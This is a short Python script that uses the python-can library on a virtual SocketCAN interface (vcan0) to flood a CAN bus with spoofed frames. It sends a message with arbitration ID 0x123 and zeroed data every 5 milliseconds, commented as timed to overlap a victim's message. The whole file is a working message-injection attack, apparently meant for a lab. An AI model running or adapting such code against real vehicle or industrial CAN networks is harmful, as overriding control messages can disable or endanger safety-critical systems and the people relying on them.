import can
import time

bus = can.interface.Bus(bustype='socketcan', channel='vcan0')

attack_msg = can.Message(arbitration_id=0x123, data=[0x00, 0x00], is_extended_id=False)
try:
    while True:
        bus.send(attack_msg)
        print(f"Attacker sent: {attack_msg}")
        time.sleep(0.005)  # Send message timed to overlap victim
except KeyboardInterrupt:
    print("Attacker stopped.")
